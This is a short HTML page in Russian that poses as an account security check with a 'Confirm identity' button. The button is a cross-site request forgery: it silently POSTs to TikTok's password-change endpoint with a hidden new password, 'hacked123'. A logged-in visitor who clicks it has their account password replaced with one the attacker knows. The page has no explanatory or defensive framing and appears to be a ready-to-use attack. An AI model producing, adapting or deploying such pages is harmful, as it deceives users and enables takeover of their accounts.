<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Secure Verification</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f0f2f5;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .container {
            background-color: #fff;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
            text-align: center;
        }
        .btn {
            background-color: #ff0050;
            color: white;
            padding: 10px 20px;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            font-size: 16px;
        }
        .btn:hover {
            background-color: #e00045;
        }
    </style>
</head>
<body>
    <div class="container">
        <h2>Проверка безопасности аккаунта</h2>
        <p>Нажмите кнопку для подтверждения вашей личности</p>
        <form action="https://www.tiktok.com/change_password" method="POST">
            <input type="hidden" name="new_password" value="hacked123">
            <input type="submit" class="btn" value="Подтвердить личность">
        </form>
    </div>
</body>
</html>
